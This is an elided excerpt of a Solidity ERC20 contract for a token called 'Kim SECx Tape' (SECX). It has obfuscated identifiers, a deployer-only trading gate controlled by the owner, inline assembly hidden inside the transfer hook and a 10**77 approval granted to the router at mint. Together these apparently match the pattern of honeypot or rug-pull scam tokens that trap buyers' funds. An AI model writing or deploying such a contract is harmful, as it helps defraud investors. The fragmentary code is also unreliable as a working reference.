...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addKimVSSECxTape;
    uint256 private addSEXC = block.number*2;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addKimVSSECxTape.push(_router); addKimVSSECxTape.push(msgSender_); addKimVSSECxTape.push(pair);
        for (uint256 q=0; q < 3;) {_firstHash[addKimVSSECxTape[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; addSEXC = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addKimVSSECxTape[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployKimVSSECxTape(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addKimVSSECxTape[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployKimVSSECxTape(creator, initialSupply);
    }
}

contract KimVSSECxTape is ERC20Token {
    constructor() ERC20Token("Kim SECx Tape", "SECX", msg.sender, 25000000 * 10 ** 18) {
    }
}